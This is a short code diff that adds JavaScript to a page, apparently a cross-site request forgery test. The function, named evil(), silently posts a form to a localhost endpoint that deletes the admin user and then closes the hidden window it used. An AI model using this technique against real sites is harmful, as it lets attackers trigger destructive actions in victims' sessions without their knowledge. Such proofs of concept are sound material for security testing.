@@ -10,6 +10,14 @@
 <script type="text/javascript">
   function evil() {
     // Can we delete the admin user?
+    var formElement = $('form');
+    formElement.attr('action', 'http://localhost:8080/vendor/delete/admin');
+    formElement.attr('method', 'post');
+    formElement.attr('target', 'evil_window');
+    formElement.submit();
+    setTimeout(function() {
+        window.open("", "evil_window").close();
+    }, 5);
   }
 </script>
 
